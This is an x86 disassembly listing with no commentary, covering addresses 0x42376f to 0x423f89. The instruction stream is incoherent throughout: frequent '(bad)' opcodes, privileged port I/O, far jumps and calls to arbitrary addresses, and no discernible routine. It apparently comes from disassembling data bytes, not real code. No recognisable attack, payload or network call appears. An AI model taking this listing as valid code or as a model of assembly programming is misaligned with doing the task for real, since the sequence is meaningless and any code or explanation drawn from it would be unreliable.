  42376f:	or     al,0xd5
  423771:	stos   BYTE PTR es:[edi],al
  423772:	sbb    BYTE PTR [edi+0x1e48a41d],al
  423778:	push   cs
  423779:	arpl   WORD PTR [ecx+0x6ece7516],bx
  42377f:	daa    
  423780:	xor    al,0xfc
  423782:	ret    0x4272
  423785:	fnsave [eax-0x13]
  423788:	test   DWORD PTR [esp+ecx*8+0x12e76b15],edi
  42378f:	and    esi,esp
  423791:	(bad)  
  423792:	in     eax,0x40
  423794:	and    al,bh
  423796:	lock adc al,0xe0
  423799:	test   DWORD PTR [ebx+0x63],eax
  42379c:	and    DWORD PTR [esi-0x14],ebp
  42379f:	lds    ebx,FWORD PTR [eax+0xd]
  4237a2:	in     eax,dx
  4237a3:	dec    edi
  4237a4:	mov    esp,0x55204281
  4237a9:	fdivr  QWORD PTR [edx]
  4237ab:	lds    esp,FWORD PTR [ebp+ebx*4-0x19]
  4237af:	jb     0x4237bb
  4237b1:	pop    ebx
  4237b2:	inc    eax
  4237b3:	xor    eax,0x9f333211
  4237b8:	mov    ecx,0x713fba16
  4237bd:	xchg   ebp,eax
  4237be:	sahf   
  4237bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4237c0:	sar    edx,0x41
  4237c3:	dec    esp
  4237c4:	push   0x49ce2df0
  4237c9:	inc    edi
  4237ca:	jle    0x423765
  4237cc:	sti    
  4237cd:	cmp    al,0xe6
  4237cf:	adc    eax,0xf3a5e51
  4237d4:	ja     0x4237e3
  4237d6:	push   ebp
  4237d7:	pop    edi
  4237d8:	ins    DWORD PTR es:[edi],dx
  4237d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4237da:	add    BYTE PTR [eax+0x71],cl
  4237dd:	jns    0x4237af
  4237df:	in     eax,dx
  4237e0:	(bad)  
  4237e1:	mov    edi,0xe438de79
  4237e6:	xor    esi,ecx
  4237e8:	xchg   BYTE PTR [esi],cl
  4237ea:	fdivr  DWORD PTR [eax]
  4237ec:	mov    ebx,0xf7d0bb82
  4237f1:	adc    al,BYTE PTR [ebx]
  4237f3:	into   
  4237f4:	xchg   esi,eax
  4237f5:	sub    cl,ah
  4237f7:	jmp    0x423866
  4237f9:	sub    al,0xf
  4237fb:	pop    ecx
  4237fc:	div    DWORD PTR [edi+eax*8+0x17]
  423800:	stc    
  423801:	nop
  423802:	cmc    
  423803:	imul   ebx,DWORD PTR [ecx+0x54b96e94],0x10
  42380a:	adc    ebp,DWORD PTR [ecx+0x7d]
  42380d:	cmp    al,0x13
  42380f:	gs cld 
  423811:	mov    BYTE PTR [edi+0x2fee11a0],0x45
  423818:	fisubr DWORD PTR [ecx+0x3300d64f]
  42381e:	add    al,0x25
  423821:	pop    es
  423822:	or     edi,esp
  423824:	sub    bh,BYTE PTR [ecx]
  423826:	call   edi
  423828:	(bad)
  42382b:	xchg   ebp,eax
  42382c:	ss nop
  42382e:	mov    ch,ch
  423830:	fmul   QWORD PTR [esi-0x663715c6]
  423836:	int    0xac
  423838:	mov    ch,0x7
  42383a:	jmp    0x423810
  42383c:	lods   al,BYTE PTR ds:[esi]
  42383d:	dec    edi
  42383e:	mov    ah,BYTE PTR [ebp+0x54fc9721]
  423844:	rol    DWORD PTR [ebp-0x374266d2],cl
  42384a:	ret    0x1ee7
  42384d:	cs pop ss
  42384f:	xor    DWORD PTR [ecx+edi*8],0x59
  423853:	aas    
  423854:	pop    ebx
  423855:	inc    ebx
  423856:	or     BYTE PTR [edi],dl
  423858:	cli    
  423859:	sub    BYTE PTR [edi+0x1a],ch
  42385c:	push   es
  42385d:	cli    
  42385e:	and    BYTE PTR [esi-0x3b],ah
  423861:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423862:	mov    es:0x871e7789,al
  423868:	enter  0xc6f4,0xc5
  42386c:	push   edi
  42386d:	add    BYTE PTR [eax+0x61],cl
  423870:	xlat   BYTE PTR ds:[ebx]
  423871:	ins    BYTE PTR es:[edi],dx
  423872:	retf   0xb594
  423875:	jns    0x42381b
  423877:	out    dx,eax
  423878:	mov    ebp,DWORD PTR [esp+edi*1]
  42387b:	mov    ds:0x954e4eaa,al
  423880:	scas   al,BYTE PTR es:[edi]
  423881:	je     0x423855
  423883:	mov    bl,BYTE PTR [eax-0x755522a5]
  423889:	adc    DWORD PTR ss:[esi-0x9],ebx
  42388d:	enter  0x79df,0xdf
  423891:	in     eax,0x10
  423893:	hlt    
  423894:	lds    edi,FWORD PTR [edi+eax*2+0x7570b9cb]
  42389b:	xchg   edi,eax
  42389c:	aas    
  42389d:	jnp    0x423850
  42389f:	out    0x80,al
  4238a1:	bound  eax,QWORD PTR [esi-0x1593d589]
  4238a7:	lods   al,BYTE PTR ds:[esi]
  4238a8:	int3   
  4238a9:	mov    esi,0x56bbde69
  4238ae:	shl    BYTE PTR [ebp+0x5],cl
  4238b1:	ficom  WORD PTR [edi]
  4238b3:	xchg   ebp,eax
  4238b4:	mov    dl,0x43
  4238b6:	mov    bh,0x6f
  4238b8:	push   cs
  4238b9:	mov    ebx,0xe7137470
  4238be:	(bad)  
  4238bf:	lock cmp al,0xe5
  4238c2:	dec    ecx
  4238c3:	out    dx,eax
  4238c4:	cmp    BYTE PTR [ebp-0x376c8502],0xf5
  4238cb:	repnz sbb DWORD PTR [edx+0x28b6f6d5],edx
  4238d2:	out    0x1a,al
  4238d4:	lea    ecx,ds:0x1cd2e5ef
  4238da:	xor    al,0x5a
  4238dc:	mov    ds:0xe88e6c4f,al
  4238e1:	lds    esi,FWORD PTR [ebx*2-0x7f205145]
  4238e8:	hlt    
  4238e9:	in     al,dx
  4238ea:	out    0x12,eax
  4238ec:	outs   dx,BYTE PTR ds:[esi]
  4238ed:	add    edx,DWORD PTR [ebp+0x5a103eed]
  4238f3:	pushf  
  4238f4:	call   0x627a4ae
  4238f9:	mov    cl,0x90
  4238fb:	and    eax,edi
  4238fd:	sub    al,0x7a
  4238ff:	mov    ecx,0x769844e9
  423904:	pop    ds
  423905:	rol    BYTE PTR [ebx-0xf77f7b0],cl
  42390b:	jno    0x4238ab
  42390d:	add    ebx,DWORD PTR ds:0x6598b5a5
  423913:	pop    ss
  423914:	mov    DWORD PTR [eax+0x48],ebp
  423917:	xchg   BYTE PTR [ecx-0x3a],dh
  42391a:	dec    DWORD PTR [edx]
  42391c:	sub    eax,0x7ff52107
  423921:	xor    esp,DWORD PTR [ebx-0x59e77ffa]
  423927:	push   es
  423928:	cli    
  423929:	mov    edi,0x22cbe671
  42392e:	inc    edi
  42392f:	ret    
  423930:	mov    eax,ds:0x19353e9b
  423935:	std    
  423936:	scas   al,BYTE PTR es:[edi]
  423937:	and    edx,DWORD PTR [ecx]
  423939:	mov    edx,0x4215b466
  42393e:	inc    edx
  42393f:	data16 and ah,BYTE PTR [eax]
  423942:	or     al,0x19
  423944:	push   ebp
  423945:	sbb    eax,0x12e49180
  42394a:	jo     0x42393f
  42394c:	mov    ecx,ecx
  42394e:	jns    0x423986
  423950:	sti    
  423951:	adc    BYTE PTR [esi+esi*8+0x14b4f7cc],0xc
  423959:	mov    al,ds:0x774fd10f
  42395e:	(bad)  
  42395f:	sar    ch,1
  423961:	xchg   dh,bh
  423963:	push   esp
  423964:	dec    ecx
  423965:	fsubr  QWORD PTR [ebp+0x10d9678]
  42396b:	xchg   BYTE PTR [ecx-0x35],cl
  42396e:	pop    eax
  42396f:	cmp    DWORD PTR [ecx+0x4e],edi
  423972:	mov    dh,BYTE PTR [ecx]
  423974:	das    
  423975:	iret   
  423976:	mov    eax,ds:0x9e1b31b1
  42397b:	cmp    DWORD PTR [ebx-0x25],0x79
  42397f:	cmp    eax,0x25df29a7
  423984:	sahf   
  423985:	push   ss
  423986:	aaa    
  423987:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423988:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423989:	dec    eax
  42398a:	cdq    
  42398b:	dec    edx
  42398c:	cld    
  42398d:	push   ds
  42398e:	xor    esi,DWORD PTR ds:0x6ba316d4
  423994:	lods   al,BYTE PTR ds:[esi]
  423995:	fdivrp st(3),st
  423997:	test   ecx,0x64415fd8
  42399d:	fsubr  st(4),st
  42399f:	test   al,0x8c
  4239a1:	add    ch,BYTE PTR [ebx+0x5fe57a09]
  4239a7:	inc    ebx
  4239a8:	push   ecx
  4239a9:	ror    DWORD PTR [ebp-0x7741c52e],1
  4239af:	jg     0x423969
  4239b1:	inc    edi
  4239b2:	prefetch BYTE PTR [edi]
  4239b5:	xchg   esp,eax
  4239b6:	jg     0x42394f
  4239b8:	cs test eax,0x65701f74
  4239be:	sti    
  4239bf:	dec    ecx
  4239c0:	or     BYTE PTR [ebx-0x22],0xa4
  4239c4:	outs   dx,BYTE PTR ds:[esi]
  4239c5:	jge    0x423a1d
  4239c7:	stos   DWORD PTR es:[edi],eax
  4239c8:	dec    ebp
  4239c9:	loopne 0x4239dd
  4239cb:	(bad)  
  4239cc:	(bad)  
  4239cd:	repnz cmp DWORD PTR [ebx+0x7dfac7fc],esi
  4239d4:	xchg   al,ch
  4239d6:	out    0xa3,al
  4239d8:	aas    
  4239d9:	sub    DWORD PTR ds:0xbbe88f4d,0x7fd8f32c
  4239e3:	or     BYTE PTR [edi-0x51f1271c],ah
  4239e9:	pop    edi
  4239ea:	push   edi
  4239eb:	jnp    0x423a20
  4239ed:	sbb    al,BYTE PTR [ecx+0x5af4d526]
  4239f3:	enter  0x5e30,0x71
  4239f7:	jecxz  0x423a63
  4239f9:	mov    ds:0x2eaf3a70,eax
  4239fe:	clc    
  4239ff:	mov    di,0xb1ba
  423a03:	pop    eax
  423a04:	jb     0x423a48
  423a06:	call   0xd22f0341
  423a0b:	pop    eax
  423a0c:	int    0xa3
  423a0e:	add    eax,0xfb1c2cc4
  423a13:	pop    es
  423a14:	xchg   edx,eax
  423a15:	(bad)  
  423a16:	ret    0x482
  423a19:	mov    ds:0x58fb1053,eax
  423a1e:	xor    DWORD PTR [ecx+0x37],ecx
  423a21:	(bad)  
  423a22:	xchg   esi,eax
  423a23:	cmc    
  423a24:	lock in eax,0xf6
  423a27:	jmp    0x423a14
  423a29:	xchg   ecx,eax
  423a2a:	inc    edx
  423a2b:	das    
  423a2c:	mov    bl,0x90
  423a2e:	xchg   edx,eax
  423a2f:	rol    DWORD PTR [ebx],cl
  423a31:	mov    ch,0x3
  423a33:	inc    ebx
  423a34:	push   ds
  423a35:	nop
  423a36:	inc    edi
  423a37:	aam    0xe7
  423a39:	js     0x423a97
  423a3b:	(bad)  
  423a3c:	aad    0x72
  423a3e:	clc    
  423a3f:	dec    edi
  423a40:	push   eax
  423a41:	mov    al,0xed
  423a43:	and    BYTE PTR [edi],bh
  423a45:	xchg   esi,eax
  423a46:	cmp    eax,0xc0157788
  423a4b:	sbb    al,0xaa
  423a4d:	pop    esi
  423a4e:	dec    esi
  423a4f:	sub    eax,ebx
  423a51:	icebp  
  423a52:	mov    ebp,0xfe3ff14e
  423a57:	xor    bh,dh
  423a59:	sbb    DWORD PTR [ecx+0x7a],ebx
  423a5c:	jmp    0xfbd4847e
  423a61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423a62:	fwait
  423a63:	arpl   bx,sp
  423a65:	xchg   ebp,eax
  423a66:	xchg   edi,esi
  423a68:	popa   
  423a69:	popa   
  423a6a:	shl    DWORD PTR [ebx+0x7d67c1a9],0x41
  423a71:	xchg   edi,eax
  423a72:	mov    eax,0xf565b82a
  423a77:	mov    ecx,0x870f5ba0
  423a7c:	loopne 0x423aa0
  423a7e:	bound  edi,QWORD PTR [esi+0x39]
  423a81:	inc    ecx
  423a82:	sbb    DWORD PTR [ecx+0x67],eax
  423a85:	test   BYTE PTR [edi-0x36],dl
  423a88:	mov    ecx,0x413fe9f
  423a8d:	push   esp
  423a8e:	cs (bad) 
  423a90:	sbb    BYTE PTR [ebx],cl
  423a92:	and    al,0xe9
  423a94:	push   ds
  423a95:	(bad)  
  423a96:	adc    eax,0xebe45358
  423a9b:	test   DWORD PTR ds:0xa40f348,edi
  423aa1:	cld    
  423aa2:	neg    DWORD PTR [edi]
  423aa4:	mov    esi,0x59469280
  423aa9:	mov    cl,BYTE PTR [ebx-0x6b]
  423aac:	popa   
  423aad:	cmc    
  423aae:	ficom  DWORD PTR ss:[edi]
  423ab1:	mov    eax,0x515ceb1b
  423ab6:	add    BYTE PTR gs:[eax],al
	...
  423ac1:	dec    ecx
  423ac2:	cli    
  423ac3:	mov    ebx,0xfd4fbb4e
  423ac8:	dec    DWORD PTR [ecx]
  423aca:	mov    WORD PTR ds:[edi+0x32],cs
  423ace:	ss enter 0x435f,0xb3
  423ad3:	add    DWORD PTR [eax],eax
  423ad5:	scas   al,BYTE PTR es:[edi]
  423ad6:	add    eax,DWORD PTR [eax]
  423ad8:	add    ah,dh
  423ada:	cmc    
  423adb:	xchg   edi,eax
  423adc:	push   ds
  423add:	cmc    
  423ade:	or     eax,0x7ad73317
  423ae3:	call   0xc14f9712
  423ae8:	xchg   ebx,eax
  423ae9:	and    eax,0x84443036
  423aee:	fidivr DWORD PTR cs:[esi-0x69550a6b]
  423af5:	data16 jne 0x423ad1
  423af8:	addr16 in al,dx
  423afa:	cwde   
  423afb:	cli    
  423afc:	leave  
  423afd:	mov    edx,0xab02edf1
  423b02:	sub    DWORD PTR ds:0x6972a47d,ecx
  423b08:	or     ebp,DWORD PTR gs:[eax-0x2dc41161]
  423b0f:	sub    eax,0xc225b64f
  423b14:	xor    ecx,DWORD PTR ds:0x263feb20
  423b1a:	test   BYTE PTR [ecx+0x205b62bd],al
  423b20:	add    DWORD PTR [ecx+0x17],0xbb044a83
  423b27:	loope  0x423b47
  423b29:	outs   dx,BYTE PTR ds:[esi]
  423b2a:	imul   edx,DWORD PTR [ecx+ebp*4+0x309c9a3],0xffffff88
  423b32:	xor    eax,0xef66b635
  423b37:	lods   eax,DWORD PTR ds:[esi]
  423b38:	mov    ch,0xde
  423b3a:	and    dh,BYTE PTR [ebx+0x1d]
  423b3d:	fldenv ds:0x5ad9ae24
  423b43:	(bad)  
  423b44:	sbb    edx,esi
  423b46:	jnp    0x423b0e
  423b48:	jmp    0x762f:0x7d04f068
  423b4f:	cli    
  423b50:	jno    0x423b40
  423b52:	adc    cl,BYTE PTR [eax]
  423b54:	addr16 (bad) 
  423b56:	sbb    DWORD PTR [edi+0x13],ebx
  423b59:	outs   dx,BYTE PTR cs:[esi]
  423b5b:	popa   
  423b5c:	jo     0x423b7a
  423b5e:	inc    ebp
  423b5f:	mov    es,ebp
  423b61:	jp     0x423b9b
  423b63:	pop    edi
  423b64:	pop    esp
  423b65:	jg     0x423b00
  423b67:	mov    gs,WORD PTR [ebx+0x33]
  423b6a:	push   edx
  423b6b:	shl    BYTE PTR [eax],0x8c
  423b6e:	or     eax,0x89c66226
  423b73:	aaa    
  423b74:	(bad)  
  423b75:	ins    BYTE PTR es:[edi],dx
  423b76:	jmp    0xab77d654
  423b7b:	js     0x423b26
  423b7d:	xchg   edx,eax
  423b7e:	xor    DWORD PTR [ecx],edi
  423b80:	addr16 jmp 0x1f4:0x1ad44065
  423b88:	cmp    edx,DWORD PTR [ebx-0x24]
  423b8b:	and    dh,cl
  423b8d:	in     al,dx
  423b8e:	hlt    
  423b8f:	inc    esi
  423b90:	mov    ch,0x69
  423b92:	pop    ss
  423b93:	mov    eax,0xd88a10cf
  423b98:	or     BYTE PTR [edi-0x720011f],bl
  423b9e:	add    edx,DWORD PTR [edi]
  423ba0:	mov    eax,0x92d9207a
  423ba5:	cmp    BYTE PTR [ebp+eiz*8+0x63bacf21],bl
  423bac:	retf   
  423bad:	imul   ebp,DWORD PTR [eax-0x3e],0x18acec58
  423bb4:	test   eax,0x60c93490
  423bb9:	mov    ecx,DWORD PTR [esi-0x417f9306]
  423bbf:	call   0xefc9:0x7c145bdf
  423bc6:	push   edi
  423bc7:	or     eax,0xf2dac86f
  423bcc:	sbb    al,0x4f
  423bce:	cli    
  423bcf:	retf   0xb5ef
  423bd2:	lahf   
  423bd3:	inc    DWORD PTR [edx+0x6b]
  423bd6:	adc    ch,cl
  423bd8:	test   eax,0x1df42af5
  423bdd:	jge    0x423c59
  423bdf:	arpl   WORD PTR [edx-0x5e],sp
  423be2:	cmp    DWORD PTR [edx],edi
  423be4:	xor    eax,0x56cf6f11
  423be9:	dec    esi
  423bea:	dec    ebx
  423beb:	xlat   BYTE PTR ds:[ebx]
  423bec:	cs dec esi
  423bee:	sbb    BYTE PTR [ebp-0x139c86a3],cl
  423bf4:	clc    
  423bf5:	push   ds
  423bf6:	or     BYTE PTR ds:0xc54dc876,ch
  423bfc:	mov    esp,0xbe4f6665
  423c01:	xor    al,0xea
  423c03:	mov    edx,0xf395ddf7
  423c08:	scas   eax,DWORD PTR es:[edi]
  423c09:	sbb    dh,ah
  423c0b:	cmp    esi,DWORD PTR [esi+edx*4+0x34f333d1]
  423c12:	add    cl,BYTE PTR [edi]
  423c14:	cmp    eax,0x64c75f7e
  423c19:	jle    0x423bd8
  423c1b:	adc    ecx,DWORD PTR [ebx+0x7a]
  423c1e:	xchg   ebp,eax
  423c1f:	pop    es
  423c20:	call   0xcb80dd3e
  423c25:	pop    esp
  423c26:	pop    esi
  423c27:	mov    dh,0xa9
  423c29:	stos   DWORD PTR es:[edi],eax
  423c2a:	mov    eax,0xc850fd97
  423c2f:	pop    eax
  423c30:	pop    esp
  423c31:	fcomi  st,st(1)
  423c33:	xor    esi,DWORD PTR [eax-0x34]
  423c36:	inc    ecx
  423c37:	push   ss
  423c38:	shl    BYTE PTR [edx+0xe],cl
  423c3b:	test   BYTE PTR [ebp+0x5d],0x98
  423c3f:	jge    0x423bf9
  423c41:	add    dl,BYTE PTR [ecx]
  423c43:	popf   
  423c44:	idiv   BYTE PTR [edx-0xd]
  423c47:	es loopne 0x423bdb
  423c4a:	add    DWORD PTR [esi+edx*8+0x27034b15],esi
  423c51:	ins    DWORD PTR es:[edi],dx
  423c52:	and    DWORD PTR [edx],esp
  423c54:	or     eax,edi
  423c56:	cli    
  423c57:	pop    ds
  423c58:	xchg   esi,eax
  423c59:	shr    DWORD PTR [esi-0x74f54dd9],cl
  423c5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423c60:	jecxz  0x423c89
  423c62:	lods   eax,DWORD PTR ds:[esi]
  423c63:	int3   
  423c64:	aaa    
  423c65:	pop    ebp
  423c66:	(bad)  
  423c67:	dec    esp
  423c68:	mov    al,ds:0xd4cc0058
  423c6d:	shl    ebx,cl
  423c6f:	or     ecx,DWORD PTR [ebp-0x5d7e0865]
  423c75:	or     ch,BYTE PTR [ebp+0x7a72d4]
  423c7b:	fidiv  WORD PTR [ecx+0x2e]
  423c7e:	int3   
  423c7f:	fbstp  TBYTE PTR [esi+ebp*2-0x3b91e8ea]
  423c86:	repz les ebp,FWORD PTR [eax-0x1d92bdbe]
  423c8d:	xchg   esp,eax
  423c8e:	ds pop es
  423c90:	xor    al,0x19
  423c92:	imul   esi
  423c94:	jno    0x423c25
  423c96:	sbb    al,0x1d
  423c98:	mov    DWORD PTR ds:0xc518f2f6,ebp
  423c9e:	(bad)  
  423c9f:	xlat   BYTE PTR ds:[ebx]
  423ca0:	lods   eax,DWORD PTR ds:[esi]
  423ca1:	(bad)
  423ca5:	mov    dl,BYTE PTR [ebx]
  423ca7:	mov    bh,0x8b
  423ca9:	mov    ebx,0x828ded80
  423cae:	cmp    BYTE PTR [ecx+0x77],al
  423cb1:	push   ebx
  423cb2:	imul   ebp,ecx,0x3a
  423cb5:	js     0x423c77
  423cb7:	fs popw ss
  423cba:	jnp    0x423c96
  423cbc:	scas   eax,DWORD PTR es:[edi]
  423cbd:	sbb    esp,DWORD PTR [eax+0x22018744]
  423cc3:	clc    
  423cc4:	out    dx,al
  423cc5:	loop   0x423cb9
  423cc7:	and    eax,0xce96db08
  423ccc:	or     eax,0xf58bd78c
  423cd1:	dec    eax
  423cd2:	je     0x423c8a
  423cd4:	iret   
  423cd5:	bound  eax,QWORD PTR [eax+ebp*1]
  423cd8:	jecxz  0x423d3f
  423cda:	out    dx,al
  423cdb:	rcl    BYTE PTR [eax*1-0xc93c779],cl
  423ce2:	mov    esp,0x4b931e57
  423ce7:	js     0x423cf8
  423ce9:	cmp    DWORD PTR [esi],0xae4936d6
  423cef:	push   0x53b60c33
  423cf4:	lods   al,BYTE PTR ds:[esi]
  423cf5:	jecxz  0x423c7d
  423cf7:	and    BYTE PTR [edx+0x4c49466e],bh
  423cfd:	xchg   DWORD PTR [eax+0x43],esp
  423d00:	mul    ah
  423d02:	test   DWORD PTR [ebp+0xf2bfe0a],edx
  423d08:	ret    
  423d09:	call   0x5b5ce6a3
  423d0e:	and    eax,0x16dbd13a
  423d13:	sub    BYTE PTR [edi],al
  423d15:	(bad)  
  423d16:	std    
  423d17:	cmc    
  423d18:	shr    ch,1
  423d1a:	leave  
  423d1b:	xor    eax,0x261c982
  423d20:	cmp    eax,0x63f71a69
  423d25:	je     0x423d41
  423d27:	cmc    
  423d28:	lock jl 0x423d03
  423d2b:	dec    eax
  423d2c:	pop    DWORD PTR [esi-0x62]
  423d2f:	fsub   DWORD PTR [ebp+0x4cef1020]
  423d35:	rcl    DWORD PTR [esi-0x7818a1a1],0xce
  423d3c:	adc    esi,DWORD PTR [ecx+0x45a2a170]
  423d42:	add    DWORD PTR [ebx-0x4f],ebx
  423d45:	adc    al,BYTE PTR [ebp+esi*1+0x5622c2fa]
  423d4c:	in     eax,dx
  423d4d:	jae    0x423da6
  423d4f:	mov    ecx,DWORD PTR [edi+0x14]
  423d52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423d53:	rcr    dl,0xb5
  423d56:	adc    al,BYTE PTR [esi+0x551fc6fe]
  423d5c:	sub    ecx,DWORD PTR [ecx]
  423d5e:	call   0x8336:0x3efe1523
  423d65:	inc    ebx
  423d66:	mov    ch,0xde
  423d68:	mov    ebx,0x60fc8911
  423d6d:	(bad)  
  423d6e:	and    cl,BYTE PTR [eax+0x3779e86e]
  423d74:	pop    edi
  423d75:	std    
  423d76:	adc    eax,0x61709465
  423d7b:	addr16 inc esp
  423d7d:	std    
  423d7e:	pop    esp
  423d7f:	push   cs
  423d80:	jo     0x423d03
  423d82:	mov    edx,0x482b5591
  423d87:	loop   0x423d89
  423d89:	lods   eax,DWORD PTR ds:[esi]
  423d8a:	out    dx,al
  423d8b:	adc    dl,0xf9
  423d8e:	mov    esi,0xad7e6840
  423d93:	fdiv   DWORD PTR [ebp-0x8]
  423d96:	xchg   esi,eax
  423d97:	pop    edx
  423d98:	cmc    
  423d99:	mov    edi,0xb02c7bab
  423d9e:	xor    BYTE PTR [edx],ch
  423da0:	das    
  423da1:	dec    eax
  423da2:	not    DWORD PTR [esi+0x18]
  423da5:	xor    ch,BYTE PTR [esi]
  423da7:	shr    BYTE PTR [esi],1
  423da9:	aas    
  423daa:	jmp    0x1988:0x57b75e05
  423db1:	mov    ecx,0x92617721
  423db6:	sub    eax,0x1af2d1d6
  423dbb:	jo     0x423e38
  423dbd:	adc    al,0x9d
  423dbf:	lods   al,BYTE PTR ds:[esi]
  423dc0:	mov    ds,WORD PTR [ecx+esi*2+0x67]
  423dc4:	mov    ds:0xe24ab5fc,eax
  423dc9:	mov    edx,0xdcd35229
  423dce:	push   es
  423dcf:	cdq    
  423dd0:	shl    BYTE PTR [edi+edx*1+0x7d],1
  423dd4:	sub    dl,BYTE PTR [edi]
  423dd6:	cmp    eax,0x5ef054e3
  423ddb:	mov    WORD PTR [ecx],ss
  423ddd:	sti    
  423dde:	call   0x1db4465a
  423de3:	ficom  DWORD PTR cs:[ebx]
  423de6:	push   ecx
  423de7:	ret    
  423de8:	pop    edi
  423de9:	inc    esi
  423dea:	fs xchg edx,eax
  423dec:	(bad)  
  423ded:	int    0xfa
  423def:	jg     0x423df4
  423df1:	push   esp
  423df2:	xchg   esi,eax
  423df3:	daa    
  423df4:	add    al,BYTE PTR [edi+0x21]
  423df7:	imul   esp,DWORD PTR [ecx+0x3f],0xcec1727
  423dfe:	out    dx,al
  423dff:	or     al,0x62
  423e01:	psllq  mm3,QWORD PTR gs:[esi+esi*4+0x1e1fce9]
  423e0a:	inc    ecx
  423e0b:	imul   BYTE PTR [edx-0x56]
  423e0e:	neg    DWORD PTR [esi+0x1f961777]
  423e14:	mov    al,ds:0x1546d014
  423e19:	in     al,dx
  423e1a:	ins    BYTE PTR es:[edi],dx
  423e1b:	(bad)  
  423e1c:	fdiv   QWORD PTR cs:[eax+ecx*4-0x6e]
  423e21:	int    0x1d
  423e23:	or     DWORD PTR [ebp+0x4dd1ebc1],esp
  423e29:	imul   esp,esp,0x1
  423e2c:	pop    ebp
  423e2d:	rcl    DWORD PTR [ecx],0xd5
  423e30:	push   ebx
  423e31:	leave  
  423e32:	fwait
  423e33:	lahf   
  423e34:	mov    ecx,DWORD PTR [esi+ebx*1+0x7cd69e61]
  423e3b:	push   esp
  423e3c:	jno    0x423eb7
  423e3e:	sub    dh,BYTE PTR [esi-0xb]
  423e41:	push   0xc7f39f3a
  423e46:	inc    edx
  423e47:	dec    ebp
  423e48:	ds fs push edi
  423e4b:	push   ebx
  423e4c:	push   ebp
  423e4d:	gs pop ds
  423e4f:	push   ss
  423e50:	cmp    ch,BYTE PTR [ebx+ecx*1-0x44]
  423e54:	lods   al,BYTE PTR es:[esi]
  423e56:	add    BYTE PTR [esi-0x453cd7db],dh
  423e5c:	(bad)  
  423e5d:	mov    eax,ds:0xff43ef79
  423e62:	mov    ebx,0xb1fef2d9
  423e67:	jns    0x423e02
  423e69:	test   DWORD PTR [esi+eiz*4],eax
  423e6c:	addr16 lock cwde 
  423e6f:	mov    bh,0x70
  423e71:	xor    eax,0x7e79ed93
  423e76:	xchg   ebp,eax
  423e77:	les    esi,FWORD PTR [edi]
  423e79:	(bad)  
  423e7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423e7b:	ins    BYTE PTR es:[edi],dx
  423e7c:	mov    dl,0xe
  423e7e:	sbb    edx,0xffffffcf
  423e81:	or     al,0x64
  423e83:	jp     0x423eb0
  423e85:	add    al,0x45
	...
  423e8f:	add    BYTE PTR [eax],al
  423e91:	xor    ebx,ecx
  423e93:	xor    BYTE PTR [ebx-0x6],0x7b
  423e97:	icebp  
  423e98:	retf   
  423e99:	aam    0xe9
  423e9b:	imul   esp,ebp,0xffffff8d
  423e9e:	mov    ah,0x20
  423ea0:	loop   0x423e93
  423ea2:	mov    dh,0x1
  423ea4:	add    BYTE PTR [esi-0x3bfffffd],ch
  423eaa:	sar    BYTE PTR [ebp-0x5a],0x7a
  423eae:	call   0xf508fe80
  423eb3:	les    ebx,FWORD PTR [edi]
  423eb5:	adc    DWORD PTR [edx-0x69e21d57],0x78
  423ebc:	mov    ds:0x91706d49,eax
  423ec1:	adc    DWORD PTR [edi+0x25],0x5981aea7
  423ec8:	mov    ds:0x50db8588,al
  423ecd:	dec    eax
  423ece:	inc    edx
  423ecf:	scas   al,BYTE PTR es:[edi]
  423ed0:	daa    
  423ed1:	test   DWORD PTR [ebp+0x26],ebx
  423ed4:	cs pop edx
  423ed6:	retf   
  423ed7:	jno    0x423eb3
  423ed9:	pop    edx
  423eda:	adc    DWORD PTR [edi],ebp
  423edc:	jmp    0xdb1b1f59
  423ee1:	jge    0x423f5c
  423ee3:	pop    esp
  423ee4:	imul   esi,DWORD PTR [edx],0x10
  423ee7:	jp     0x423ecd
  423ee9:	mov    edx,esi
  423eeb:	bound  eax,QWORD PTR [ebp+0x63]
  423eee:	cmp    eax,0x1d90de67
  423ef3:	cmp    edi,ecx
  423ef5:	ja     0x423e96
  423ef7:	inc    edx
  423ef8:	imul   ebp,DWORD PTR ss:[ecx-0x31],0xffffff83
  423efd:	aaa    
  423efe:	adc    edi,ebp
  423f00:	push   ebx
  423f01:	add    al,0xf1
  423f03:	out    dx,eax
  423f04:	sti    
  423f05:	ds sub bl,bl
  423f08:	cld    
  423f09:	adc    al,0x73
  423f0b:	loop   0x423f08
  423f0d:	add    al,0x7a
  423f0f:	cmp    dl,BYTE PTR [esp+ebp*8-0x129efcaf]
  423f16:	std    
  423f17:	inc    edi
  423f18:	ror    BYTE PTR [esi+edx*8+0x434450a0],1
  423f1f:	add    eax,0x7804120
  423f24:	leave  
  423f25:	retf   
  423f26:	and    al,0xd8
  423f28:	stos   DWORD PTR es:[edi],eax
  423f29:	stos   DWORD PTR es:[di],eax
  423f2b:	pop    esi
  423f2c:	mov    eax,eax
  423f2e:	jae    0x423ec2
  423f30:	or     bh,BYTE PTR [eax+0x19]
  423f33:	and    BYTE PTR [edx-0x6711e948],dl
  423f39:	shl    edx,1
  423f3b:	std    
  423f3c:	(bad)  [esi+0x2cc86b3c]
  423f42:	ret    
  423f43:	add    eax,0x58d08cb3
  423f48:	push   esi
  423f49:	out    0x87,al
  423f4b:	mov    ch,0x18
  423f4d:	xor    al,0xba
  423f4f:	mov    esi,0x8494345c
  423f54:	mov    ebx,0xec249243
  423f59:	mov    ecx,0xd4875a20
  423f5e:	or     BYTE PTR [ebp+edi*2+0x8863f66],al
  423f65:	(bad)  
  423f66:	jmp    0xbac54fe9
  423f6b:	call   0x38930228
  423f70:	inc    edi
  423f71:	sub    esi,DWORD PTR [eax-0x31f3001d]
  423f77:	sbb    ebp,ebx
  423f79:	xor    dh,cl
  423f7b:	sahf   
  423f7c:	cmp    ch,bl
  423f7e:	sub    ah,BYTE PTR [edx+edi*2+0x38aa88ad]
  423f85:	xlat   BYTE PTR ds:[ebx]
  423f86:	jle    0x423f8e
  423f88:	pop    edx
  423f89:	mov    eax,ds:0xaad7f04e
